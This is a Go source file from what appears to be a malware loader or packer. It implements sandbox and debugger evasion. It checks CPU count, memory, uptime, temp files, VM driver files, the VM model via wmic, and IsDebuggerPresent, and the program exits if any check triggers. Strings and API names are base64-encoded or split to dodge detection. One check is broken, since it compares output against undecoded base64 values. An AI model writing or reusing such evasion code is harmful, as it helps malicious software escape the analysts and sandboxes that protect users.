package sandbox

import (
	"upx/utils"
	"encoding/base64"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"
	"unsafe"
)

func CheckSandBox(canCheck bool) {
	if !canCheck {
		return
	}
	//
	if numberOfCPU() {
		os.Exit(0)
	}
	//
	if numberOfTempFiles() {
		os.Exit(0)
	}
	//
	if checkVirtualFile() {
		os.Exit(0)
	}
	//
	if bootTime() {
		os.Exit(0)
	}
	//
	if physicalMemory() {
		os.Exit(0)
	}
	//
	if platformLimits() {
		os.Exit(0)
	}
	//
	if check, _ := checkVirtual(); check {
		os.Exit(0)
	}
}

// checkVirtual
func checkVirtual() (bool, error) {
	model := ""
	var cmd *exec.Cmd
	cmd = exec.Command("cmd", "/C", "wmic path Win32_ComputerSystem get Model")
	stdout, err := cmd.Output()
	if err != nil {
		return false, err
	}
	vms := []string{"VmlydHVhbEJveA==", "dmlydHVhbA==", "Vk13YXJl", "S1ZN", "Qm9jaHM=", "SFZNIGRvbVU=", "UGFyYWxsZWxz"}
	model = strings.ToLower(string(stdout))
	for _, vm := range vms {
		if strings.Contains(model, vm) {
			return true, nil
		}
	}
	return false, nil
}

// bootTime
func bootTime() bool {
	GetTickCount := utils.GetProc(utils.GetKe32DllName(), "Get"+"Tick"+"Count")
	r, _, _ := GetTickCount.Call()
	if r == 0 {
		return false
	}
	ms := time.Duration(r * 1000 * 1000)
	tm := time.Duration(30 * time.Minute)
	if ms < tm {
		return true
	} else {
		return false
	}
}

// physicalMemory
func physicalMemory() bool {
	var mem uint64
	proc := utils.GetProc(utils.GetKe32DllName(), "Get"+"Physically"+"Installed"+"System"+"Memory")
	proc.Call(uintptr(unsafe.Pointer(&mem)))
	mem = mem / 1048576
	if mem <= 4 {
		return true
	}
	return false
}

// numberOfCPU
func numberOfCPU() bool {
	a := runtime.NumCPU()
	if a <= 4 {
		return true
	} else {
		return false
	}
}

// numberOfTempFiles
func numberOfTempFiles() bool {
	conn := os.Getenv("temp")
	var k int
	if conn == "" {
		return false
	} else {
		local_dir := conn
		err := filepath.Walk(local_dir, func(filename string, fi os.FileInfo, err error) error {
			if fi.IsDir() {
				return nil
			}
			k++
			return nil
		})
		if err != nil {
			return false
		}
	}
	if k < 30 {
		return true
	}
	return false
}

func checkVirtualFile() bool {
	// check drivers file
	driversDirPath, _ := base64.StdEncoding.DecodeString("Qzpcd2luZG93c1xTeXN0ZW0zMlxEcml2ZXJz")
	if fileInfos, err := os.ReadDir(string(driversDirPath)); err == nil {
		fileNames := []string{
			"Vm1tb3VzZS5zeXM=", "dm10cmF5LmRsbA==", "Vk1Ub29sc0hvb2suZGxs", "dm1tb3VzZXZlci5kbGw=",
			"dm1oZ2ZzLmRsbA==", "dm1HdWVzdExpYi5kbGw=", "VkJveE1vdXNlLnN5cw==", "VkJveEd1ZXN0LnN5cw==",
			"VkJveFNGLnN5cw==", "VkJveFZpZGVvLnN5cw==",
		}
		for _, fileInfo := range fileInfos {
			if !fileInfo.IsDir() {
				for _, name := range fileNames {
					fName, _ := base64.StdEncoding.DecodeString(name)
					if strings.Contains(fileInfo.Name(), string(fName)) {
						return true
					}
				}
			}
		}
	}
	// check sys32 file
	dirPath, _ := base64.StdEncoding.DecodeString("Qzpcd2luZG93c1xTeXN0ZW0zMg==")
	if fileInfos, err := os.ReadDir(string(dirPath)); err == nil {
		fileNames := []string{
			"dmJveGRpc3AuZGxs", "dmJveGhvb2suZGxs", "dmJveG9nbGVycm9yc3B1LmRsbA==", "dmJveG9nbHBhc3N0aHJvdWdoc3B1LmRsbA==",
			"dmJveHNlcnZpY2UuZXhl", "dmJveHRyYXkuZXhl", "VkJveENvbnRyb2wuZXhl",
		}
		for _, fileInfo := range fileInfos {
			if !fileInfo.IsDir() {
				for _, name := range fileNames {
					fName, _ := base64.StdEncoding.DecodeString(name)
					if strings.Contains(fileInfo.Name(), string(fName)) {
						return true
					}
				}
			}
		}
	}
	return false
}

func platformLimits() bool {
	isDebuggerPresent := utils.GetProc(utils.GetKe32DllName(), "Is"+"Debugger"+"Present")
	var nargs uintptr = 0
	ret, _, _ := isDebuggerPresent.Call(nargs)
	if int32(ret) != 0 {
		return true
	}
	return false
}
